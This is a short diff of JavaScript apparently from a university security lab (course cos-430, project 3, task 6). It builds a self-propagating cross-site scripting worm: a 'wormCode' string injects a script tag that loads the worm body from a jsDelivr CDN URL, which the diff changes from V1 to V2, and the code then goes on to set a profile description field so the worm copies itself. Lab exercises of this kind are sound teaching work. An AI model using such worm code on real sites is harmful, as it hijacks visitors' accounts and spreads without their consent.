@@ -2,7 +2,7 @@ window.onload = function(){
     var wormCode = encodeURIComponent(
         "<script type=\"text/javascript\" " +
         "id=\"worm\" " +
-        "src=\"https://cdn.jsdelivr.net/gh/spiny-lumpsucker/cos-430@V1/project03_task6_link4.js\">" +
+        "src=\"https://cdn.jsdelivr.net/gh/spiny-lumpsucker/cos-430@V2/project03_task6_link4.js\">" +
         "</" + "script>");
 
     // Set the content for the description field
